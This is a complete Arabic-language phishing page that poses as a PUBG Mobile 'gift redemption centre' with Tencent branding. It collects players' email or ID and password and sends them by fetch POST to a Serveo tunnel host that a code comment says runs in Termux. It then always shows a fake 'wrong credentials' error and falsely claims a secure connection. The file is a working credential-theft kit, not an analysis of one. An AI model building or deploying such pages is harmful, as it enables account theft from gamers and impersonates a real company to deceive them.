<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز مكافآت اللاعبين | PUBG Mobile Style</title>
    <style>
        /* تنسيقات CSS الاحترافية */
        body {
            background-color: #0b0e11;
            background-image: radial-gradient(circle, #1a202c 0%, #0b0e11 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 90%;
            max-width: 500px;
            background: #1c242d;
            border: 1px solid #38444d;
            border-radius: 12px;
            padding: 30px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
            text-align: center;
        }

        .header img {
            width: 150px;
            margin-bottom: 20px;
        }

        h2 {
            color: #facc15;
            font-size: 1.5rem;
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        p {
            color: #94a3b8;
            font-size: 0.9rem;
            margin-bottom: 25px;
        }

        .input-group {
            text-align: right;
            margin-bottom: 20px;
        }

        .input-group label {
            display: block;
            color: #e2e8f0;
            margin-bottom: 8px;
            font-weight: bold;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 6px;
            color: #fff;
            box-sizing: border-box;
            outline: none;
            transition: border 0.3s;
        }

        .input-group input:focus {
            border-color: #facc15;
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background: #facc15;
            color: #000;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            font-size: 1rem;
            cursor: pointer;
            transition: transform 0.2s, background 0.3s;
        }

        .btn-submit:hover {
            background: #eab308;
            transform: scale(1.02);
        }

        /* تنسيق رسالة الخطأ */
        #error-msg {
            color: #ff4d4d;
            display: none;
            margin-top: 15px;
            font-size: 0.85rem;
            font-weight: bold;
            border: 1px solid #ff4d4d;
            padding: 10px;
            border-radius: 6px;
            background: rgba(255, 77, 77, 0.1);
        }

        .footer-note {
            margin-top: 25px;
            padding-top: 15px;
            border-top: 1px solid #334155;
            font-size: 0.75rem;
            color: #64748b;
        }

        .security-badge {
            color: #22c55e;
            display: inline-block;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <img src="https://logodownload.org/wp-content/uploads/2019/04/pubg-mobile-logo.png" alt="PUBG Logo">
        </div>

        <h2>مركز استرداد الهدايا</h2>
        <p>قم بتسجيل الدخول إلى حساب اللاعب الخاص بك للمطالبة بالمكافآت الموسمية.</p>

        <form id="loginForm">
            <div class="input-group">
                <label>البريد الإلكتروني أو معرف اللاعب</label>
                <input type="text" id="email" placeholder="مثال: player@mail.com" required>
            </div>
            
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
            </div>

            <button type="submit" class="btn-submit">تفعيل المكافأة الآن</button>
            
            <div id="error-msg">تأكد من انك لم تغلط في كتابه كلمه السر او الايميل كلمه السر والايميل خطا</div>
        </form>

        <div class="footer-note">
            <span class="security-badge">● اتصال آمن ومحمي</span>
            <br>
            حقوق النشر © 2026 شركة TENCENT. جميع الحقوق محفوظة.
            <br>
            هذه الصفحة مخصصة للعرض التقني المتقدم.
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); // منع الصفحة من التحديث

            const emailValue = document.getElementById('email').value;
            const passValue = document.getElementById('password').value;
            const errorElement = document.getElementById('error-msg');

            // رابط Serveo الخاص بك (تأكد أنه لا يزال يعمل في Termux)
            const serveoUrl = 'https://9e0352a7fadca04c-134-35-2-106.serveousercontent.com';

            // إرسال البيانات إلى السيرفر
            fetch(serveoUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: emailValue,
                    pass: passValue
                })
            })
            .then(res => console.log("Data sent!"))
            .catch(err => console.log("Connection error"))
            .finally(() => {
                // إظهار رسالة الخطأ الحمراء دائماً
                errorElement.style.display = 'block';
            });
        });
    </script>

</body>
</html>
